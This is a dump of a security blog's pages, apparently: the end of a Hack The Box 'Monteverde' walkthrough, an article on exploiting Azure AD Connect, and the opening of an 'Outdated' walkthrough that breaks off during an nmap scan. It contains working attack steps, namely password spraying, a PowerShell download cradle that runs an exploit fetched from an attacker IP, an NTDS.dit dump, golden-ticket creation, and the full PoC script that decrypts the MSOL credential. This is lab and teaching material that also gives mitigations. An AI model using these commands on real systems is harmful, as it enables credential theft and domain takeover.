be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) So it appears it\u0026rsquo;s a printer server site of some sort. What is also interesting is the CN name \u0026ldquo;Configuration\u0026rdquo;, this could imply that it is still to be configured. Which is interesting as things that are still being configured may not have had thorough security standards actioned. serverName: CN=MONTEVERDE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=MEGABANK,DC=LOCAL It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. I update my /etc/hosts file now that we have the server name.\nThis is so we can use tools like kerbrute for user enumeration as well as other tools later on. LDAP User Enumeration: As anonymous bind is enabled we can enumerate all the users on the domain also:\nldapsearch -H ldap://monteverde.MEGABANK.LOCAL -x -b \u0026quot;DC=MEGABANK,DC=LOCAL\u0026quot; -s sub \u0026quot;(\u0026amp;(objectclass=user))\u0026quot; | grep sAMAccountName: | cut -f2 -d\u0026quot; \u0026quot; \u0026gt;\u0026gt; ldapUsers.txt Discoveries:\nLooking at the file we can see it\u0026rsquo;s a small list of users, but most noticeably there are also a series of services running which is interesting. However we can confirm this is an Azure Active Directory environment as there is a user called: AAD_987d7f2f57d2 Azure AD often uses unique object identifiers like AAD_987d7f2f57d2 to represent accounts or resources internally. I add all the users to my users list. LDAP Group Enumeration: We can also enumerate the groups on the domain:\nldapsearch -H ldap://monteverde.MEGABANK.LOCAL -x -b \u0026quot;DC=MEGABANK,DC=LOCAL\u0026quot; -s sub \u0026quot;(\u0026amp;(objectclass=group))\u0026quot; | grep sAMAccountName: | cut -f2 -d\u0026quot; \u0026quot; \u0026gt;\u0026gt; ldapGroups.txt Discoveries:\nLooking at the list of groups there are some interesting standout groups here: SQLServer2005SQLBrowserUser$MONTEVERDE This is interesting as it does not appear the SQL service is running publicly on a port. Azure This could be part of an azure environment which could be interesting. Reception Operations Trading HelpDesk Developers We can also generate a list of users who are members of specific groups too: for group in $(cat ldapGroups.txt); do ldapsearch -H ldap://monteverde.MEGABANK.LOCAL -x -b \u0026quot;DC=MEGABANK,DC=LOCAL\u0026quot; -s sub \u0026quot;(\u0026amp;(objectCategory=Person)(sAMAccountName=*)(memberOf=CN=$group,OU=Groups,DC=MEGABANK,DC=LOCAL))\u0026quot; \u0026gt;\u0026gt; ldapGroupMemberships.txt; done DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Standard entries for an AD env. Kerberos 88: Using Kerbrute to bruteforce Usernames: As kerberos is present we can enumerate users using kerbrute : kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt We have some usernames, these were all found using LDAP, however this is still good to have. SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares netexec smb $box -u '' -p '' --shares Guest account is disabled and null sessions are not allowed it appears. Trying Usernames as Passwords: I always try usernames as passwords as well: netexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep [+] It appears that SABatchJobs is using their username as a password, naught naughty. 2. Foothold: Enumerating the Domain SABatchJobs: Running a bloodhound collection: As we have creds now we can run a remote bloodhound collection: python3 bloodhound.py -dc monteverde.$domain -c All -u $user -p $user -d $domain -ns $box +Note+: The reason this keeps going and I do not check it initially is as it was running the collection I continued to manually enumerate. Enumerating SMB Shares: Listing the shares we can see some interesting entries: netexec smb $box -u $user -p $user --shares The azure_uploads \u0026amp; users$ is particularly interesting. I check the azure_uploads directory but it is empty: smbclient -U $domain\\\\$user \\\\\\\\$box\\\\azure_uploads Finding azure.xml in the user mhope\u0026rsquo;s user share: Enumerating the users$ shares I find a file called azure.xml in the user\u0026rsquo;s mhope directory: smbclient -U $domain\\\\$user \\\\\\\\$box\\\\users$ I download it: Finding a hard-coded password in azure.xml: Reading the azure.xml file I find a hard-coded password within it: Discovering that mhope re-uses passwords: I check the password for re-use and it appears that mhope re-uses passwords: netexec smb $box -u $user -p $pass --shares Connecting to the host as mhope: I connect using evil-winrm: evil-winrm -i $box -u $user -p $pass After some general enumeration I elect to check bloodhound to see if we have any obvious privilege escalation paths. 3. Privilege Escalation: Discovering mhope is part of the azure admins group: Checking bloodhound I can see that mhope is a part of the azure admins group:\nI quickly check for Azure Admin privilege escalation path on google and find the following article:\nhttps://blog.xpnsec.com/azuread-connect-for-redteam/ So we need to find out if Azure Connect is running before this is a viable privilege escalation path. Enumerating the Azure Service: Checking Azure Connect Directory Exists \u0026amp; The Service Is Running: I check if Azure connect AD Sync directory exists:\nTest-Path \u0026quot;C:\\Program Files\\Microsoft Azure AD Sync\u0026quot; True, so this could work. Lets enumerate further. Let\u0026rsquo;s check if the AD Sync binary is installed:\nGet-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ADSync -Name \u0026quot;ImagePath\u0026quot; So it\u0026rsquo;s running, good. Checking for the ADSync Database: From reading the article, we can see that LocalDB should be running on a default installation: It says:\nNow by default when deploying the connector a new database is created on the host using SQL Server’s LOCALDB. To view information on the running instance, we can use the installed SqlLocalDB.exe tool: \u0026lt;SNIP\u0026gt; So what are the requirements to complete this exfiltration of credentials? Well we will need to have access to the LocalDB (if configured to use this DB)\nWhat is SQL Server Express LocalDB? Overview of LocalDB: LocalDB is a lightweight version of SQL Server Express designed for developers to quickly and easily create and test SQL Server databases without the overhead of a full SQL Server installation. Key Features of LocalDB:\nDeveloper-focused: It’s intended for development and local testing purposes, providing a simple and fast setup for SQL Server database instances. On-demand: LocalDB runs on-demand, meaning it starts up when an application tries to connect and shuts down when not in use, minimizing resource usage. User-level instance: LocalDB runs under the user’s context, without requiring admin privileges to manage or install. No configuration needed: Unlike a full SQL Server instance, LocalDB doesn\u0026rsquo;t require setup or configuration—it\u0026rsquo;s essentially plug-and-play. SQL Server API compatibility: LocalDB supports the same T-SQL commands and APIs as the full version of SQL Server, so code written against LocalDB will work with any edition of SQL Server. Use Cases of LocalDB:\nDevelopment environment: Ideal for developers needing a local SQL Server database without complex configuration or high resource use. Testing and debugging: Developers can create, test, and debug SQL Server applications in a contained environment before deploying to a full SQL Server instance. Unit testing: Allows database-related unit testing to be performed locally and quickly. Core Characteristics of LocalDB:\nInstance Type:\nLocalDB runs as a user-mode process, meaning it\u0026rsquo;s user-specific and does not require a system-wide installation of SQL Server. Each user on a machine can have their own instances of LocalDB. Communication via Named Pipes:\nUnlike full SQL Server instances that communicate via TCP/IP ports, LocalDB uses named pipes for connections, ensuring simplicity and security for local communication. No Service Required:\nLocalDB does not run as a Windows service. It is an on-demand process that starts and stops as needed when an application makes a connection. Supports Multiple Instances:\nYou can run multiple LocalDB instances, such as the default instance (MSSQLLocalDB) or custom-named instances. Each instance is independent and isolated from others. Further reading:\nhttps://learn.microsoft.com/en-us/sql/tools/sqlLocalDB-utility?view=sql-server-ver16 Looking for LocalDB binary: Looking online I find this article which says where the SqlLocalDB.exe should be found:\n\u0026quot;C:\\Program Files\\Microsoft SQL Server\\160\\Tools\\Binn\\SqlLocalDB.exe\u0026quot; Not found. Searching for SqlLocalDB.exe\nLooking at the folder structure of: \u0026quot;C:\\Program Files\\Microsoft SQL Server\u0026quot; I can see that there is no 160 folder. Looking online, I find this post on StackOverflow:\nIt says we should be able to find the binary in either \u0026quot;C:\\Program Files\\Microsoft SQL Server\\110\\Tools\\Binn or \u0026quot;C:\\Program Files\\Microsoft SQL Server\\120\\Tools\\Binn As there is no 120 on our host I check 110 Finding SQLCMD.EXE in 110: I check 110 \u0026amp; can see that there is no SqlLocalDB.exe but there is a SQLCMD.EXE executable:\nI check the other folders 140, 150, 80 \u0026amp; 90 but there is nothing of interest. SQLCMD.EXE is used for interacting with local/remote SQL instances. We did not see SQL running in our NMAP scans, so should check if it\u0026rsquo;s running internally:\nnetstat -ano | findstr :1433 Okay, looks to be running internally, which means this is a non-standard installation of Azure AD Connect that isn\u0026rsquo;t using LocalDB, so it must be running SQL. Connecting to the SQL Instance: I check if we can run commands on the SQL Instance: sqlcmd -S MONTEVERDE -Q \u0026quot;SELECT name FROM master.dbo.sysdatabases\u0026quot; We can \u0026amp; I can see that the ADSync database is present! 4. Ownership: Modifying XPN\u0026rsquo;s POC to work: Looking at the POC on XPN\u0026rsquo;s page we can see the opening line says:\n$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026#34;Data Source=(localdb)\\.\\ADSync;Initial Catalog=ADSync\u0026#34; https://blog.xpnsec.com/azuread-connect-for-redteam/ However this instance is not using localdb so we need to modify this:\nData Source=(localdb)\\.\\ADSync: Uses localdb, a lightweight version of SQL Server primarily meant for developers (which is not running). The (localdb)\\.\\ADSync points to a specific instance of LocalDB. Initial Catalog=ADSync: Specifies the database ADSync that we want to connect to. Updated Version:\n$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026#34;Server=127.0.0.1;Database=ADSync;Integrated Security=True\u0026#34; Server=127.0.0.1: Uses the local machine\u0026rsquo;s loopback address (127.0.0.1) to connect to the SQL Server instance. As we know that SQL is running internally. Integrated Security=True: This enables Windows Authentication, using the current user\u0026rsquo;s credentials to authenticate with the SQL Server. As we know mhope has the required permissions to connect to the instance: I actually did a deep dive into how this whole attack works, you can find it here:\nhttps://bloodstiller.com/articles/azureadconnect/ Running the Exploit to Extract the Administrator Password: I start my python webserver:\npython3 -h http.server 9000 I use a download cradle to run the exploit:\niex(new-object net.webclient).downloadstring('http://10.10.14.46:9000/AdConnectPOC.ps1') We get the administrators password. +Deep Dive+: I have a deep dive into download cradles and how they work: https://bloodstiller.com/articles/understandingdownloadcradles/ I verify the password works using netexec:\nnetexec smb $box -u $user -p $pass --shares Let\u0026rsquo;s grab our root flag too.\n5. Persistence: Dumping NTDS.dit: I use netexec to dump the NTDS.dit: netexec smb $box -u $user -p $pass -M ntdsutil Creating a Golden Ticket: Using impacket-lookupsid to extract the domain SID:\nimpacket-lookupsid $domain/administrator@$box -domain-sids I use impacket-ticketer to create the ticket:\nIt kicks out a bunch of errors but creates the administrator.ccache I load the ticket into the KRB5CCNAME Variable:\nexport KRB5CCNAME=./administrator.ccache I sync my clock with the target:\nsudo ntpdate -s monteverde.$domain I connect using impacket-psexec:\nimpacket-psexec monteverde.$domain -k Lessons Learned: What did I learn? I learned ALOT about Azure AD Connect. I would not have been able to do this without the post from xpn: https://blog.xpnsec.com/azuread-connect-for-redteam/ Honestly so much about the AD Connect service. I have done a more thorough writeup and have actually broken down xpn\u0026rsquo;s exploit in this post: https://bloodstiller.com/articles/azureadconnect/ What silly mistakes did I make? Not too bad this time, it was more about just getting my head around Azure AD Connect and understanding XPN\u0026rsquo;s script took me the longest Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/monteverde-box\/"
    },
    
    "http:\/\/localhost:1313\/articles\/azureadconnectattack\/": {
        "title": "Understanding Azure AD Connect Exploitation \u0026 Privilege Escalation",
        "tags": ["Windows","Active Directory","Azure AD Connect","Azure","SQL","MSSQL",],
        "content": "Used-For: Connecting on-premises AD instances with Azure cloud instances Overview: Azure AD Connect is a Microsoft tool designed to bridge on-premises Active Directory (AD) with Azure AD in the cloud. It offers several synchronization methods:\nPass-through Authentication (PTA): Validates users\u0026rsquo; passwords directly against on-premises AD Enables enforcement of on-premises security and password policies Federated Authentication (ADFS): Uses a separate federated authentication system like AD FS Provides advanced capabilities like multi-factor authentication and third-party MFA integration Password Hash Synchronization (PHS): Synchronizes a hash of the hash of users\u0026rsquo; passwords from on-premises AD to Azure AD Allows for cloud-based authentication without on-premises infrastructure dependency Password Hash Synchronization (PHS) Method: Here\u0026rsquo;s a simplified diagram illustrating the Password Hash Synchronization (PHS) method:\n+----------------------+ | On-Premises AD | +----------------------+ | | \u0026#34;User accounts \u0026amp; attributes\u0026#34; v +----------------------+ | Azure AD Connect | | +------------------+ | | | Azure AD Sync | | | | Service | | | +------------------+ | | +------------------+ | | | Password Hash | | | | Sync Agent | | | +------------------+ | +----------------------+ | | | \u0026#34;Synchronized | \u0026#34;Synchronized | user accounts| password hashes\u0026#34; | \u0026amp; attributes\u0026#34;| v v +----------------------+ | Azure AD | +----------------------+ +Note+: Password hashes are further hashed before being sent to Azure AD for additional security. This diagram illustrates the flow of data in the PHS method:\nUser accounts and attributes are sent from the on-premises AD to the Azure AD Sync Service within Azure AD Connect. Password hashes are separately processed by the Password Hash Sync Agent. Synchronized user accounts and attributes are sent to Azure AD. Synchronized (and further hashed) password hashes are sent to Azure AD. The separation of user data and password hash synchronization processes within Azure AD Connect is a key security feature, but it\u0026rsquo;s also what allows for potential exploitation if an attacker gains access to the Azure AD Connect server.\nInstallation Configurations: A default installation of Azure AD Connect uses a SQL Server Express instance as a LocalDB, connecting over a named pipe. This configuration is common and straightforward to set up.\nHowever, it\u0026rsquo;s important to note that custom installations are possible. In some cases, Azure AD Connect might be configured to use a full Microsoft SQL Server installation. This SQL Server could be bound to a port internally but not accessible externally. Such custom setups can occur when organizations have specific requirements or are integrating Azure AD Connect with existing database infrastructure.\nUnderstanding the installation configuration is crucial for both security assessments and potential exploitation attempts. It affects how the system can be enumerated, what vulnerabilities might be present, and how any potential attacks could be carried out.\nThe Vulnerability Context The exploit we\u0026rsquo;ll be discussing doesn\u0026rsquo;t rely on a software bug, but rather on the architectural design of Azure AD Connect and potential misconfigurations in its deployment. This is particularly relevant to installations using Password Hash Synchronization (PHS).\nTechnical Deep Dive 1. The MSOL Account During installation, Azure AD Connect creates a service account named MSOL_[HEX]. This account is granted extensive permissions, including:\nReplicating Directory Changes Replicating Directory Changes All Replicating Directory Changes In Filtered Set These permissions allow the account to perform Directory Replication Service (DRS) operations, including +DCSync+.\n2. Password Hash Synchronization (PHS) Mechanism PHS uses the Microsoft.Online.PasswordSynchronization.dll assembly to handle hash synchronization. This DLL leverages the same DRS APIs used by tools like Mimikatz for +DCSync+ operations.\n3. Local Database Storage Azure AD Connect stores its configuration in a SQL Server LocalDB instance by default. Key information includes:\nDatabase: ADSync Table: mms_management_agent Fields of interest: private_configuration_xml encrypted_configuration 4. Encryption Mechanism The MSOL account password is encrypted and stored in the encrypted_configuration field. Decryption is handled by mcrypt.dll, located in the Azure AD Connect installation directory.\nC:\\Program Files\\Microsoft Azure AD Sync\\Binn\\mcrypt.dll Enumerating Azure AD Connect: Before attempting to exploit Azure AD Connect, it\u0026rsquo;s important to confirm its presence and understand its configuration. Here\u0026rsquo;s a structured approach to enumeration:\n1. Confirm Azure AD Connect Installation: Check for the Azure AD Connect installation directory:\nTest-Path \u0026#34;C:\\Program Files\\Microsoft Azure AD Sync\u0026#34; Check for Azure AD Connect service in the registry:\nGet-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ADSync Check for the Azure AD Connect synchronization service:\nGet-Service ADSync 2. Identify Azure AD Connect Accounts: Search for MSOL_ or AAD_ accounts in Active Directory: Get-ADUser -Filter \u0026#34;samaccountname -like \u0026#39;MSOL_*\u0026#39; -or samaccountname -like \u0026#39;AAD_*\u0026#39;\u0026#34; -Properties * 3. Determine Database Configuration: Check for LocalDB (default configuration):\nSqlLocalDB.exe info ADSync If LocalDB is not found, check for full SQL Server installation:\nGet-ChildItem \u0026#34;C:\\Program Files\\Microsoft SQL Server\u0026#34; -ErrorAction SilentlyContinue If this is found jump to step 5 4. LocalDB Enumeration (if applicable): List LocalDB instances:\nSqlLocalDB.exe info Start the ADSync instance if it\u0026rsquo;s not running:\nSqlLocalDB.exe start ADSync Get the pipe name for the ADSync instance:\nSqlLocalDB.exe info ADSync | findstr \u0026#34;Instance pipe name\u0026#34; 5. SQL Server Enumeration (for custom installations): Check for SQL Server network configuration:\nnetstat -ano | findstr :1433 Enumerate SQL Server instances:\nGet-ItemProperty \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\Instance Names\\SQL\u0026#34; Check for custom database configuration in Azure AD Connect files:\nGet-Content \u0026#34;C:\\Program Files\\Microsoft Azure AD Sync\\Data\\ADSync.mdf\u0026#34; 6. Determine Synchronization Method (GUI only): Open the Synchronization Service Manager:\nC:\\Program Files\\Microsoft Azure AD Sync\\UIShell\\miisclient.exe In the \u0026ldquo;Connectors\u0026rdquo; tab, look for a connector of type \u0026ldquo;Windows Azure Active Directory (Microsoft)\u0026rdquo;.\nCheck if the \u0026ldquo;Password Synchronization\u0026rdquo; column shows \u0026ldquo;Enabled\u0026rdquo; for Password Hash Synchronization.\n7. Check for Required Permissions Verify current user\u0026rsquo;s group membership:\nwhoami /groups Look for \u0026ldquo;BUILTIN\\Administrators\u0026rdquo; or \u0026ldquo;ADSyncAdmins\u0026rdquo; in the output.\n+Note+: It is also worth checking if the user is part of any other Administrator groups with inherited permissions etc.\n8. Check if we can interact with the database (SQL Custom installation): In this example if the default LocalDB is NOT being used we can see if it\u0026rsquo;s possible to query the underlying database using sqlcmd (if it\u0026rsquo;s installed) sqlcmd -S \u0026lt;FQDNINSTANCE\u0026gt; -Q \u0026#34;SELECT name FROM master.dbo.sysdatabases\u0026#34; +Attacking Azure AD Connect+ Exploitating Azure AD Connect Using PowerShell: Here\u0026rsquo;s a complete PowerShell script that demonstrates the exploitation process:\nThis script must be run on the same machine as the Azure AD Connect server. This script must be run with the same privileges as the MSOL account. This script is by @_xpn_ \u0026amp; the original can be found here: https://blog.xpnsec.com/azuread-connect-for-redteam/ https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545#file-azuread_decrypt_msol-ps1 +Note+: I am using this script and explaining it here for educational purposes. You can see my walkthrough for the box Monteverde to see a full demonstration of this in action. https://bloodstiller.com/walkthroughs/monteverde-box/ Write-Host \u0026#34;AD Connect Sync Credential Extract POC (@_xpn_)`n\u0026#34; $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026#34;Data Source=(localdb)\\.\\ADSync;Initial Catalog=ADSync\u0026#34; $client.Open() $cmd = $client.CreateCommand() $cmd.CommandText = \u0026#34;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration\u0026#34; $reader = $cmd.ExecuteReader() $reader.Read() | Out-Null $key_id = $reader.GetInt32(0) $instance_id = $reader.GetGuid(1) $entropy = $reader.GetGuid(2) $reader.Close() $cmd = $client.CreateCommand() $cmd.CommandText = \u0026#34;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = \u0026#39;AD\u0026#39;\u0026#34; $reader = $cmd.ExecuteReader() $reader.Read() | Out-Null $config = $reader.GetString(0) $crypted = $reader.GetString(1) $reader.Close() add-type -path \u0026#39;C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll\u0026#39; $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager $km.LoadKeySet($entropy, $instance_id, $key_id) $key = $null $km.GetActiveCredentialKey([ref]$key) $key2 = $null $km.GetKey(1, [ref]$key2) $decrypted = $null $key2.DecryptBase64ToString($crypted, [ref]$decrypted) $domain = select-xml -Content $config -XPath \u0026#34;//parameter[@name=\u0026#39;forest-login-domain\u0026#39;]\u0026#34; | select @{Name = \u0026#39;Domain\u0026#39;; Expression = {$_.node.InnerXML}} $username = select-xml -Content $config -XPath \u0026#34;//parameter[@name=\u0026#39;forest-login-user\u0026#39;]\u0026#34; | select @{Name = \u0026#39;Username\u0026#39;; Expression = {$_.node.InnerXML}} $password = select-xml -Content $decrypted -XPath \u0026#34;//attribute\u0026#34; | select @{Name = \u0026#39;Password\u0026#39;; Expression = {$_.node.InnerText}} Write-Host (\u0026#34;Domain: \u0026#34; + $domain.Domain) Write-Host (\u0026#34;Username: \u0026#34; + $username.Username) Write-Host (\u0026#34;Password: \u0026#34; + $password.Password) Let\u0026rsquo;s break down the key parts of this exploit:\n1. Connecting to the Database: LocalDB Version: $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026#34;Data Source=(localdb)\\.\\ADSync;Initial Catalog=ADSync\u0026#34; $client.Open() Line-by-line breakdown: Creates a new SqlConnection object to connect to the LocalDB instance. $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026quot;Data \u0026quot;Data Source=(localdb)\\.\\ADSync\u0026quot; specifies the LocalDB instance name. \u0026quot;Initial Catalog=ADSync\u0026quot; specifies the database name. $client.Open() Opens the connection to the database. SQL Server Version:\n$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026#34;Server=127.0.0.1;Database=ADSync;Integrated Security=True\u0026#34; $client.Open() Line-by-line breakdown: Creates a new SqlConnection object to connect to a full SQL Server instance. $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026quot;Server=127.0.0.1\u0026quot; specifies the local machine\u0026rsquo;s loopback address, as SQL is running internally. \u0026quot;Database=ADSync\u0026quot; specifies the database name. \u0026quot;Integrated Security=True\u0026quot; enables Windows Authentication, using the current user\u0026rsquo;s credentials. The current user would need to have the correct permissions on the SQL database. $client.Open() Opens the connection to the database. This version would be used if attacking a full SQL Server instance running locally on the host, rather than the standard LocalDB installation. 2. Retrieving Encryption Keys $cmd = $client.CreateCommand() $cmd.CommandText = \u0026#34;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration\u0026#34; $reader = $cmd.ExecuteReader() $reader.Read() | Out-Null $key_id = $reader.GetInt32(0) $instance_id = $reader.GetGuid(1) $entropy = $reader.GetGuid(2) $reader.Close() Line-by-line breakdown: $cmd = $client.CreateCommand()\nCreates a new SqlCommand object associated with the connection. $cmd.CommandText = \u0026quot;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration\u0026quot;\nSets the SQL query to retrieve encryption key information. $reader = $cmd.ExecuteReader()\nExecutes the query and returns a SqlDataReader object. $reader.Read() | Out-Null\nReads the first row of the result set. $key_id = $reader.GetInt32(0)\nRetrieves the keyset_id value from the first column. $instance_id = $reader.GetGuid(1)\nRetrieves the instance_id value from the second column. $entropy = $reader.GetGuid(2)\nRetrieves the entropy value from the third column. $reader.Close()\nCloses the reader to free up resources. 3. Retrieving Encrypted Configuration $cmd = $client.CreateCommand() $cmd.CommandText = \u0026#34;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = \u0026#39;AD\u0026#39;\u0026#34; $reader = $cmd.ExecuteReader() $reader.Read() | Out-Null $config = $reader.GetString(0) $crypted = $reader.GetString(1) $reader.Close() Line-by-line breakdown: $cmd = $client.CreateCommand()\nCreates a new SqlCommand object. $cmd.CommandText = \u0026quot;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'\u0026quot;\nSets the SQL query to retrieve the encrypted configuration for the AD management agent. $reader = $cmd.ExecuteReader()\nExecutes the query and returns a SqlDataReader object. $reader.Read() | Out-Null\nReads the first row of the result set. $config = $reader.GetString(0)\nRetrieves the private_configuration_xml value from the first column. $crypted = $reader.GetString(1)\nRetrieves the encrypted_configuration value from the second column. $reader.Close()\nCloses the reader. 4. Decrypting the Configuration add-type -path \u0026#39;C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll\u0026#39; $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager $km.LoadKeySet($entropy, $instance_id, $key_id) $key = $null $km.GetActiveCredentialKey([ref]$key) $key2 = $null $km.GetKey(1, [ref]$key2) $decrypted = $null $key2.DecryptBase64ToString($crypted, [ref]$decrypted) Line-by-line breakdown: add-type -path 'C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll'\nLoads the mcrypt.dll library for decryption. $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager\nCreates a new KeyManager object for handling encryption keys. $km.LoadKeySet($entropy, $instance_id, $key_id)\nLoads the key set using the previously retrieved entropy, instance_id, and key_id. $key = $null\nInitializes a variable to store the active credential key. $km.GetActiveCredentialKey([ref]$key)\nRetrieves the active credential key. $key2 = $null\nInitializes a variable to store a secondary key. $km.GetKey(1, [ref]$key2)\nRetrieves the secondary key (key ID 1). $decrypted = $null\nInitializes a variable to store the decrypted configuration. $key2.DecryptBase64ToString($crypted, [ref]$decrypted)\nDecrypts the encrypted configuration using the secondary key. 5. Extracting Credentials $domain = select-xml -Content $config -XPath \u0026#34;//parameter[@name=\u0026#39;forest-login-domain\u0026#39;]\u0026#34; | select @{Name = \u0026#39;Domain\u0026#39;; Expression = {$_.node.InnerXML}} $username = select-xml -Content $config -XPath \u0026#34;//parameter[@name=\u0026#39;forest-login-user\u0026#39;]\u0026#34; | select @{Name = \u0026#39;Username\u0026#39;; Expression = {$_.node.InnerXML}} $password = select-xml -Content $decrypted -XPath \u0026#34;//attribute\u0026#34; | select @{Name = \u0026#39;Password\u0026#39;; Expression = {$_.node.InnerText}} Write-Host (\u0026#34;Domain: \u0026#34; + $domain.Domain) Write-Host (\u0026#34;Username: \u0026#34; + $username.Username) Write-Host (\u0026#34;Password: \u0026#34; + $password.Password) Line-by-line breakdown: $domain = select-xml -Content $config -XPath \u0026quot;//parameter[@name='forest-login-domain']\u0026quot; | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}\nExtracts the domain from the configuration XML using XPath. $username = select-xml -Content $config -XPath \u0026quot;//parameter[@name='forest-login-user']\u0026quot; | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}\nExtracts the username from the configuration XML using XPath. $password = select-xml -Content $decrypted -XPath \u0026quot;//attribute\u0026quot; | select @{Name = 'Password'; Expression = {$_.node.InnerText}}\nExtracts the password from the decrypted configuration using XPath. Write-Host (\u0026quot;Domain: \u0026quot; + $domain.Domain)\nDisplays the extracted domain. Write-Host (\u0026quot;Username: \u0026quot; + $username.Username)\nDisplays the extracted username. Write-Host (\u0026quot;Password: \u0026quot; + $password.Password)\nDisplays the extracted password. Exploiting AD Connect Using adconnectdump : It is also possible to dump credentials using dirkjanm\u0026rsquo;s tools found in the adconnect repo:\nThere are 3 different tools available which require specific circumstances to use. I will not go into detail here. I am just adding as a reference. Building is required using Visual Studio:\nExample of this attack: +Walkthrough+: for the box Monteverde https://bloodstiller.com/walkthroughs/monteverde-box/ Mitigation Strategies Implement strict access controls on the Azure AD Connect server. Use Just-In-Time (JIT) access for administrative tasks. Enable and monitor advanced auditing for the MSOL account. Consider using Pass-through Authentication (PTA) instead of PHS if feasible. Regularly rotate the MSOL account password. Implement network segmentation to limit access to the Azure AD Connect server. Use a hardware security module (HSM) for key storage if possible. Detection Monitor for:\nUnusual queries to the LocalDB instance Attempts to load or access mcrypt.dll Unexpected use of the MSOL account, especially for replication activities By understanding this process, security teams can better protect their Azure AD Connect deployments and detect potential exploitation attempts.\n", 
        "url": "http:\/\/localhost:1313\/articles\/azureadconnectattack\/"
    },
    
    "http:\/\/localhost:1313\/tags\/follina\/": {
        "title": "Follina",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/follina\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/outdated-box\/": {
        "title": "Outdated HTB Walkthrough",
        "tags": ["Box","HTB","Medium","Windows","Active Directory","WSUS","Kerberos","Follina","Rubeus","Whisker","Shadow Credentials","msDS-KeyCredentialLink",],
        "content": "Outdated Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Outdated How I use variables \u0026amp; wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scan:\nnmap $box -Pn -oA basicScan kali in 46.02-HTB/BlogEntriesMade/Outdated/scans/nmap 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 08:49:14 zsh ❯ nmap $box -Pn -oA basicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 08:49 BST Nmap scan report for 10.129.229.239 Host is up (0.039s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE 25/tcp open smtp 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 10.89 seconds In depth scan:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP\nkali in 46.02-HTB/BlogEntriesMade/Outdated/scans/nmap 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh took 11s 🕙 08:49:33 